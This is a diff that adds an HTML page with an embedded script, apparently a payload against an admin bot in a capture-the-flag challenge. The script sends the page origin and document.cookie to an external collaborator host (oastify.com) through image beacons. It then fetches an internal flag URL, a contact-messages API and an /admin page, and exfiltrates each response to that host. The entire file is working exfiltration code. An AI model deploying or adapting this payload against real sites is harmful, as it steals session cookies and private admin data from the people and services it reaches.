@@ -1,0 +1,16 @@
+<!doctype html><html><body><script>
+const C = 'http://a6huj3sdbl5zdq65rxphm6840v6muci1.oastify.com';
+function beacon(tag, data){ new Image().src = C + '/' + tag + '?d=' + encodeURIComponent((data||'').slice(0,600)); }
+
+// what origin is the bot on, and does it have a session?
+beacon('origin', location.origin);
+beacon('cookie', document.cookie);
+
+// try to read the flag over internal HTTP
+fetch('http://127.0.0.1:8080/ctf/flag').then(r=>r.text())
+  .then(t=>beacon('flag_http', t)).catch(e=>beacon('flag_http_err', ''+e));
+
+// try same-origin app endpoints the admin bot may be authed to
+fetch('/api/contact/messages').then(r=>r.text()).then(t=>beacon('msgs', t)).catch(()=>{});
+fetch('/admin').then(r=>r.text()).then(t=>beacon('admin', t)).catch(()=>{});
+</script></body></html>
